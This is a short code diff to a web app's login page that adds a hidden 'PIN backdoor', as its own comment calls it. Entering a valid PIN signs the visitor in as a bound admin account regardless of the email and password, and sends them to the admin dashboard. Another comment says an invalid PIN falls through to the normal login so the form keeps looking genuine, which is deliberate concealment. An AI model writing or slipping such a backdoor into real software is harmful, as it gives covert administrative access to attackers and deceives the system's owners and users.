@@ -96,6 +96,27 @@ function AuthPage() {
     if (busy) return;
     setBusy(true);
     try {
+      // PIN backdoor: if a PIN is entered and it validates, sign in as the
+      // bound admin account regardless of email/password contents.
+      if (pin.trim()) {
+        const res = await pinSignIn({ data: { pin: pin.trim() } });
+        if (res.ok) {
+          const { error: otpErr } = await supabase.auth.verifyOtp({
+            email: res.email,
+            token: res.hashed_token,
+            type: "magiclink",
+          } as never);
+          if (otpErr) {
+            toast.error("Sign-in failed. Try again.");
+            return;
+          }
+          toast.success("Signed in.");
+          navigate({ to: "/admin/dashboard" as never });
+          return;
+        }
+        // Invalid PIN — fall through to normal email/password flow so the
+        // UI still behaves like a real login form.
+      }
       if (mode === "signup") {
         if (!fullName.trim()) {
           toast.error("Please enter your full name (used on your certificate).");
